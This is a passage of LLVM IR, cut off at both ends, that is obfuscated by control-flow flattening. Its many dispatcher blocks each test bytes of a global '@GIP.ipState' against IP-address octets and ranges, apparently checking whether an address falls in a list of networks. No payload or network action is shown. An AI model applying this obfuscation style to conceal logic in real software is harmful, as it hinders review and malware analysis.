  store i32 %1888, i32* %switchVar
  br label %loopEnd

; <label>:1889:                                   ; preds = %loopEntry
  %1890 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1891 = zext i8 %1890 to i32
  %1892 = icmp eq i32 %1891, 251
  %1893 = select i1 %1892, i32 1835193200, i32 1822862343
  store i32 %1893, i32* %switchVar
  br label %loopEnd

; <label>:1894:                                   ; preds = %loopEntry
  %1895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1896 = zext i8 %1895 to i32
  %1897 = icmp sge i32 %1896, 19
  %1898 = select i1 %1897, i32 280070049, i32 1822862343
  store i32 %1898, i32* %switchVar
  br label %loopEnd

; <label>:1899:                                   ; preds = %loopEntry
  %1900 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1901 = zext i8 %1900 to i32
  %1902 = icmp slt i32 %1901, 21
  %1903 = select i1 %1902, i32 -886816699, i32 1822862343
  store i32 %1903, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1904:                                   ; preds = %loopEntry
  %1905 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1906 = zext i8 %1905 to i32
  %1907 = icmp eq i32 %1906, 70
  %1908 = select i1 %1907, i32 1419716942, i32 1245253838
  store i32 %1908, i32* %switchVar
  br label %loopEnd

; <label>:1909:                                   ; preds = %loopEntry
  %1910 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1911 = zext i8 %1910 to i32
  %1912 = icmp eq i32 %1911, 42
  %1913 = select i1 %1912, i32 -1130648870, i32 1245253838
  store i32 %1913, i32* %switchVar
  br label %loopEnd

; <label>:1914:                                   ; preds = %loopEntry
  %1915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1916 = zext i8 %1915 to i32
  %1917 = icmp sge i32 %1916, 73
  %1918 = select i1 %1917, i32 -670760030, i32 1245253838
  store i32 %1918, i32* %switchVar
  br label %loopEnd

; <label>:1919:                                   ; preds = %loopEntry
  %1920 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1921 = zext i8 %1920 to i32
  %1922 = icmp slt i32 %1921, 75
  %1923 = select i1 %1922, i32 -886816699, i32 1245253838
  store i32 %1923, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1924:                                   ; preds = %loopEntry
  %1925 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1926 = zext i8 %1925 to i32
  %1927 = icmp eq i32 %1926, 74
  %1928 = select i1 %1927, i32 1425296817, i32 -966217752
  store i32 %1928, i32* %switchVar
  br label %loopEnd

; <label>:1929:                                   ; preds = %loopEntry
  %1930 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1931 = zext i8 %1930 to i32
  %1932 = icmp eq i32 %1931, 91
  %1933 = select i1 %1932, i32 -757026027, i32 -966217752
  store i32 %1933, i32* %switchVar
  br label %loopEnd

; <label>:1934:                                   ; preds = %loopEntry
  %1935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1936 = zext i8 %1935 to i32
  %1937 = icmp sge i32 %1936, 113
  %1938 = select i1 %1937, i32 2121691743, i32 -966217752
  store i32 %1938, i32* %switchVar
  br label %loopEnd

; <label>:1939:                                   ; preds = %loopEntry
  %1940 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1941 = zext i8 %1940 to i32
  %1942 = icmp slt i32 %1941, 115
  %1943 = select i1 %1942, i32 -886816699, i32 -966217752
  store i32 %1943, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1944:                                   ; preds = %loopEntry
  %1945 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1946 = zext i8 %1945 to i32
  %1947 = icmp eq i32 %1946, 74
  %1948 = select i1 %1947, i32 -912658415, i32 1851147626
  store i32 %1948, i32* %switchVar
  br label %loopEnd

; <label>:1949:                                   ; preds = %loopEntry
  %1950 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1951 = zext i8 %1950 to i32
  %1952 = icmp eq i32 %1951, 201
  %1953 = select i1 %1952, i32 -147949531, i32 1851147626
  store i32 %1953, i32* %switchVar
  br label %loopEnd

; <label>:1954:                                   ; preds = %loopEntry
  %1955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1956 = zext i8 %1955 to i32
  %1957 = icmp sge i32 %1956, 56
  %1958 = select i1 %1957, i32 1711183015, i32 1851147626
  store i32 %1958, i32* %switchVar
  br label %loopEnd

; <label>:1959:                                   ; preds = %loopEntry
  %1960 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1961 = zext i8 %1960 to i32
  %1962 = icmp slt i32 %1961, 58
  %1963 = select i1 %1962, i32 -886816699, i32 1851147626
  store i32 %1963, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1964:                                   ; preds = %loopEntry
  %1965 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1966 = zext i8 %1965 to i32
  %1967 = icmp eq i32 %1966, 188
  %1968 = select i1 %1967, i32 1349110085, i32 1323545758
  store i32 %1968, i32* %switchVar
  br label %loopEnd

; <label>:1969:                                   ; preds = %loopEntry
  %1970 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1971 = zext i8 %1970 to i32
  %1972 = icmp eq i32 %1971, 209
  %1973 = select i1 %1972, i32 -1795989441, i32 1323545758
  store i32 %1973, i32* %switchVar
  br label %loopEnd

; <label>:1974:                                   ; preds = %loopEntry
  %1975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1976 = zext i8 %1975 to i32
  %1977 = icmp sge i32 %1976, 48
  %1978 = select i1 %1977, i32 1072848341, i32 1323545758
  store i32 %1978, i32* %switchVar
  br label %loopEnd

; <label>:1979:                                   ; preds = %loopEntry
  %1980 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1981 = zext i8 %1980 to i32
  %1982 = icmp slt i32 %1981, 53
  %1983 = select i1 %1982, i32 -886816699, i32 1323545758
  store i32 %1983, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1984:                                   ; preds = %loopEntry
  %1985 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1986 = zext i8 %1985 to i32
  %1987 = icmp eq i32 %1986, 188
  %1988 = select i1 %1987, i32 -534198231, i32 -1667152669
  store i32 %1988, i32* %switchVar
  br label %loopEnd

; <label>:1989:                                   ; preds = %loopEntry
  %1990 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1991 = zext i8 %1990 to i32
  %1992 = icmp eq i32 %1991, 165
  %1993 = select i1 %1992, i32 -886816699, i32 -1667152669
  store i32 %1993, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1994:                                   ; preds = %loopEntry
  %1995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1996 = zext i8 %1995 to i32
  %1997 = icmp eq i32 %1996, 149
  %1998 = select i1 %1997, i32 37594856, i32 -2072078251
  store i32 %1998, i32* %switchVar
  br label %loopEnd

; <label>:1999:                                   ; preds = %loopEntry
  %2000 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2001 = zext i8 %2000 to i32
  %2002 = icmp eq i32 %2001, 202
  %2003 = select i1 %2002, i32 -886816699, i32 -2072078251
  store i32 %2003, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2004:                                   ; preds = %loopEntry
  %2005 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2006 = zext i8 %2005 to i32
  %2007 = icmp eq i32 %2006, 151
  %2008 = select i1 %2007, i32 -274406320, i32 -1756695219
  store i32 %2008, i32* %switchVar
  br label %loopEnd

; <label>:2009:                                   ; preds = %loopEntry
  %2010 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2011 = zext i8 %2010 to i32
  %2012 = icmp eq i32 %2011, 80
  %2013 = select i1 %2012, i32 -886816699, i32 -1756695219
  store i32 %2013, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2014:                                   ; preds = %loopEntry
  %2015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2016 = zext i8 %2015 to i32
  %2017 = icmp eq i32 %2016, 164
  %2018 = select i1 %2017, i32 -1555111840, i32 2066979053
  store i32 %2018, i32* %switchVar
  br label %loopEnd

; <label>:2019:                                   ; preds = %loopEntry
  %2020 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2021 = zext i8 %2020 to i32
  %2022 = icmp eq i32 %2021, 132
  %2023 = select i1 %2022, i32 -886816699, i32 2066979053
  store i32 %2023, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2024:                                   ; preds = %loopEntry
  %2025 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2026 = zext i8 %2025 to i32
  %2027 = icmp eq i32 %2026, 176
  %2028 = select i1 %2027, i32 -1217490291, i32 2000133939
  store i32 %2028, i32* %switchVar
  br label %loopEnd

; <label>:2029:                                   ; preds = %loopEntry
  %2030 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2031 = zext i8 %2030 to i32
  %2032 = icmp eq i32 %2031, 31
  %2033 = select i1 %2032, i32 -886816699, i32 2000133939
  store i32 %2033, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2034:                                   ; preds = %loopEntry
  %2035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2036 = zext i8 %2035 to i32
  %2037 = icmp eq i32 %2036, 167
  %2038 = select i1 %2037, i32 32204202, i32 -1018609672
  store i32 %2038, i32* %switchVar
  br label %loopEnd

; <label>:2039:                                   ; preds = %loopEntry
  %2040 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2041 = zext i8 %2040 to i32
  %2042 = icmp eq i32 %2041, 114
  %2043 = select i1 %2042, i32 -886816699, i32 -1018609672
  store i32 %2043, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2044:                                   ; preds = %loopEntry
  %2045 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2046 = zext i8 %2045 to i32
  %2047 = icmp eq i32 %2046, 178
  %2048 = select i1 %2047, i32 -1445703860, i32 -609484135
  store i32 %2048, i32* %switchVar
  br label %loopEnd

; <label>:2049:                                   ; preds = %loopEntry
  %2050 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2051 = zext i8 %2050 to i32
  %2052 = icmp eq i32 %2051, 32
  %2053 = select i1 %2052, i32 -886816699, i32 -609484135
  store i32 %2053, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2054:                                   ; preds = %loopEntry
  %2055 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2056 = zext i8 %2055 to i32
  %2057 = icmp eq i32 %2056, 178
  %2058 = select i1 %2057, i32 910097926, i32 -118538507
  store i32 %2058, i32* %switchVar
  br label %loopEnd

; <label>:2059:                                   ; preds = %loopEntry
  %2060 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2061 = zext i8 %2060 to i32
  %2062 = icmp eq i32 %2061, 33
  %2063 = select i1 %2062, i32 -886816699, i32 -118538507
  store i32 %2063, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2064:                                   ; preds = %loopEntry
  %2065 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2066 = zext i8 %2065 to i32
  %2067 = icmp eq i32 %2066, 37
  %2068 = select i1 %2067, i32 -35504150, i32 978665292
  store i32 %2068, i32* %switchVar
  br label %loopEnd

; <label>:2069:                                   ; preds = %loopEntry
  %2070 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2071 = zext i8 %2070 to i32
  %2072 = icmp eq i32 %2071, 59
  %2073 = select i1 %2072, i32 -886816699, i32 978665292
  store i32 %2073, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2074:                                   ; preds = %loopEntry
  %2075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2076 = zext i8 %2075 to i32
  %2077 = icmp eq i32 %2076, 37
  %2078 = select i1 %2077, i32 -1829039742, i32 -440930298
  store i32 %2078, i32* %switchVar
  br label %loopEnd

; <label>:2079:                                   ; preds = %loopEntry
  %2080 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2081 = zext i8 %2080 to i32
  %2082 = icmp eq i32 %2081, 187
  %2083 = select i1 %2082, i32 -886816699, i32 -440930298
  store i32 %2083, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2084:                                   ; preds = %loopEntry
  %2085 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2086 = zext i8 %2085 to i32
  %2087 = icmp eq i32 %2086, 46
  %2088 = select i1 %2087, i32 1423455859, i32 -1619060005
  store i32 %2088, i32* %switchVar
  br label %loopEnd

; <label>:2089:                                   ; preds = %loopEntry
  %2090 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2091 = zext i8 %2090 to i32
  %2092 = icmp eq i32 %2091, 105
  %2093 = select i1 %2092, i32 -886816699, i32 -1619060005
  store i32 %2093, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2094:                                   ; preds = %loopEntry
  %2095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2096 = zext i8 %2095 to i32
  %2097 = icmp eq i32 %2096, 51
  %2098 = select i1 %2097, i32 -2097800817, i32 -2139421161
  store i32 %2098, i32* %switchVar
  br label %loopEnd

; <label>:2099:                                   ; preds = %loopEntry
  %2100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2101 = zext i8 %2100 to i32
  %2102 = icmp eq i32 %2101, 254
  %2103 = select i1 %2102, i32 -886816699, i32 -2139421161
  store i32 %2103, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2104:                                   ; preds = %loopEntry
  %2105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2106 = zext i8 %2105 to i32
  %2107 = icmp eq i32 %2106, 51
  %2108 = select i1 %2107, i32 -1820017350, i32 -1960865238
  store i32 %2108, i32* %switchVar
  br label %loopEnd

; <label>:2109:                                   ; preds = %loopEntry
  %2110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2111 = zext i8 %2110 to i32
  %2112 = icmp eq i32 %2111, 255
  %2113 = select i1 %2112, i32 -886816699, i32 -1960865238
  store i32 %2113, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2114:                                   ; preds = %loopEntry
  %2115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2116 = zext i8 %2115 to i32
  %2117 = icmp eq i32 %2116, 5
  %2118 = select i1 %2117, i32 8318746, i32 1584973934
  store i32 %2118, i32* %switchVar
  br label %loopEnd

; <label>:2119:                                   ; preds = %loopEntry
  %2120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2121 = zext i8 %2120 to i32
  %2122 = icmp eq i32 %2121, 135
  %2123 = select i1 %2122, i32 -886816699, i32 1584973934
  store i32 %2123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2124:                                   ; preds = %loopEntry
  %2125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2126 = zext i8 %2125 to i32
  %2127 = icmp eq i32 %2126, 5
  %2128 = select i1 %2127, i32 -1440434531, i32 -507756346
  store i32 %2128, i32* %switchVar
  br label %loopEnd

; <label>:2129:                                   ; preds = %loopEntry
  %2130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2131 = zext i8 %2130 to i32
  %2132 = icmp eq i32 %2131, 196
  %2133 = select i1 %2132, i32 -886816699, i32 -507756346
  store i32 %2133, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2134:                                   ; preds = %loopEntry
  %2135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2136 = zext i8 %2135 to i32
  %2137 = icmp eq i32 %2136, 5
  %2138 = select i1 %2137, i32 2049132555, i32 -2135918167
  store i32 %2138, i32* %switchVar
  br label %loopEnd

; <label>:2139:                                   ; preds = %loopEntry
  %2140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2141 = zext i8 %2140 to i32
  %2142 = icmp eq i32 %2141, 39
  %2143 = select i1 %2142, i32 -886816699, i32 -2135918167
  store i32 %2143, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2144:                                   ; preds = %loopEntry
  %2145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2146 = zext i8 %2145 to i32
  %2147 = icmp eq i32 %2146, 91
  %2148 = select i1 %2147, i32 -423931157, i32 -1049256539
  store i32 %2148, i32* %switchVar
  br label %loopEnd

; <label>:2149:                                   ; preds = %loopEntry
  %2150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2151 = zext i8 %2150 to i32
  %2152 = icmp eq i32 %2151, 134
  %2153 = select i1 %2152, i32 -886816699, i32 -1049256539
  store i32 %2153, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2154:                                   ; preds = %loopEntry
  %2155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2156 = zext i8 %2155 to i32
  %2157 = icmp eq i32 %2156, 104
  %2158 = select i1 %2157, i32 541732464, i32 1546228228
  store i32 %2158, i32* %switchVar
  br label %loopEnd

; <label>:2159:                                   ; preds = %loopEntry
  %2160 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2161 = zext i8 %2160 to i32
  %2162 = icmp eq i32 %2161, 200
  %2163 = select i1 %2162, i32 -1823952307, i32 1546228228
  store i32 %2163, i32* %switchVar
  br label %loopEnd

; <label>:2164:                                   ; preds = %loopEntry
  %2165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2166 = zext i8 %2165 to i32
  %2167 = icmp sge i32 %2166, 128
  %2168 = select i1 %2167, i32 116686275, i32 1546228228
  store i32 %2168, i32* %switchVar
  br label %loopEnd

; <label>:2169:                                   ; preds = %loopEntry
  %2170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2171 = zext i8 %2170 to i32
  %2172 = icmp slt i32 %2171, 159
  %2173 = select i1 %2172, i32 -886816699, i32 1546228228
  store i32 %2173, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2174:                                   ; preds = %loopEntry
  %2175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2176 = zext i8 %2175 to i32
  %2177 = icmp eq i32 %2176, 107
  %2178 = select i1 %2177, i32 -1187470141, i32 196961582
  store i32 %2178, i32* %switchVar
  br label %loopEnd

; <label>:2179:                                   ; preds = %loopEntry
  %2180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2181 = zext i8 %2180 to i32
  %2182 = icmp eq i32 %2181, 152
  %2183 = select i1 %2182, i32 1565787920, i32 196961582
  store i32 %2183, i32* %switchVar
  br label %loopEnd

; <label>:2184:                                   ; preds = %loopEntry
  %2185 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2186 = zext i8 %2185 to i32
  %2187 = icmp sge i32 %2186, 96
  %2188 = select i1 %2187, i32 1687761580, i32 196961582
  store i32 %2188, i32* %switchVar
  br label %loopEnd

; <label>:2189:                                   ; preds = %loopEntry
  %2190 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2191 = zext i8 %2190 to i32
  %2192 = icmp slt i32 %2191, 111
  %2193 = select i1 %2192, i32 -886816699, i32 196961582
  store i32 %2193, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2194:                                   ; preds = %loopEntry
  %2195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2196 = zext i8 %2195 to i32
  %2197 = icmp eq i32 %2196, 107
  %2198 = select i1 %2197, i32 -1430897647, i32 1316147831
  store i32 %2198, i32* %switchVar
  br label %loopEnd

; <label>:2199:                                   ; preds = %loopEntry
  %2200 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2201 = zext i8 %2200 to i32
  %2202 = icmp eq i32 %2201, 181
  %2203 = select i1 %2202, i32 1846922924, i32 1316147831
  store i32 %2203, i32* %switchVar
  br label %loopEnd

; <label>:2204:                                   ; preds = %loopEntry
  %2205 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2206 = zext i8 %2205 to i32
  %2207 = icmp sge i32 %2206, 160
  %2208 = select i1 %2207, i32 -1966993921, i32 1316147831
  store i32 %2208, i32* %switchVar
  br label %loopEnd

; <label>:2209:                                   ; preds = %loopEntry
  %2210 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2211 = zext i8 %2210 to i32
  %2212 = icmp slt i32 %2211, 189
  %2213 = select i1 %2212, i32 -886816699, i32 1316147831
  store i32 %2213, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2214:                                   ; preds = %loopEntry
  %2215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2216 = zext i8 %2215 to i32
  %2217 = icmp eq i32 %2216, 172
  %2218 = select i1 %2217, i32 1610626485, i32 -2048493168
  store i32 %2218, i32* %switchVar
  br label %loopEnd

; <label>:2219:                                   ; preds = %loopEntry
  %2220 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2221 = zext i8 %2220 to i32
  %2222 = icmp eq i32 %2221, 98
  %2223 = select i1 %2222, i32 -340229081, i32 -2048493168
  store i32 %2223, i32* %switchVar
  br label %loopEnd

; <label>:2224:                                   ; preds = %loopEntry
  %2225 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2226 = zext i8 %2225 to i32
  %2227 = icmp sge i32 %2226, 64
  %2228 = select i1 %2227, i32 -1769622445, i32 -2048493168
  store i32 %2228, i32* %switchVar
  br label %loopEnd

; <label>:2229:                                   ; preds = %loopEntry
  %2230 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2231 = zext i8 %2230 to i32
  %2232 = icmp slt i32 %2231, 95
  %2233 = select i1 %2232, i32 -886816699, i32 -2048493168
  store i32 %2233, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2234:                                   ; preds = %loopEntry
  %2235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2236 = zext i8 %2235 to i32
  %2237 = icmp eq i32 %2236, 184
  %2238 = select i1 %2237, i32 -1217617695, i32 1734011775
  store i32 %2238, i32* %switchVar
  br label %loopEnd

; <label>:2239:                                   ; preds = %loopEntry
  %2240 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2241 = zext i8 %2240 to i32
  %2242 = icmp eq i32 %2241, 170
  %2243 = select i1 %2242, i32 -733810581, i32 1734011775
  store i32 %2243, i32* %switchVar
  br label %loopEnd

; <label>:2244:                                   ; preds = %loopEntry
  %2245 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2246 = zext i8 %2245 to i32
  %2247 = icmp sge i32 %2246, 240
  %2248 = select i1 %2247, i32 307894731, i32 1734011775
  store i32 %2248, i32* %switchVar
  br label %loopEnd

; <label>:2249:                                   ; preds = %loopEntry
  %2250 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2251 = zext i8 %2250 to i32
  %2252 = icmp slt i32 %2251, 255
  %2253 = select i1 %2252, i32 -886816699, i32 1734011775
  store i32 %2253, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2254:                                   ; preds = %loopEntry
  %2255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2256 = zext i8 %2255 to i32
  %2257 = icmp eq i32 %2256, 192
  %2258 = select i1 %2257, i32 -696277503, i32 -600929733
  store i32 %2258, i32* %switchVar
  br label %loopEnd

; <label>:2259:                                   ; preds = %loopEntry
  %2260 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2261 = zext i8 %2260 to i32
  %2262 = icmp eq i32 %2261, 111
  %2263 = select i1 %2262, i32 -1454191497, i32 -600929733
  store i32 %2263, i32* %switchVar
  br label %loopEnd

; <label>:2264:                                   ; preds = %loopEntry
  %2265 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2266 = zext i8 %2265 to i32
  %2267 = icmp sge i32 %2266, 128
  %2268 = select i1 %2267, i32 1403516599, i32 -600929733
  store i32 %2268, i32* %switchVar
  br label %loopEnd

; <label>:2269:                                   ; preds = %loopEntry
  %2270 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2271 = zext i8 %2270 to i32
  %2272 = icmp slt i32 %2271, 143
  %2273 = select i1 %2272, i32 -886816699, i32 -600929733
  store i32 %2273, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2274:                                   ; preds = %loopEntry
  %2275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2276 = zext i8 %2275 to i32
  %2277 = icmp eq i32 %2276, 192
  %2278 = select i1 %2277, i32 -3594836, i32 1209542726
  store i32 %2278, i32* %switchVar
  br label %loopEnd

; <label>:2279:                                   ; preds = %loopEntry
  %2280 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2281 = zext i8 %2280 to i32
  %2282 = icmp eq i32 %2281, 252
  %2283 = select i1 %2282, i32 -2134624835, i32 1209542726
  store i32 %2283, i32* %switchVar
  br label %loopEnd

; <label>:2284:                                   ; preds = %loopEntry
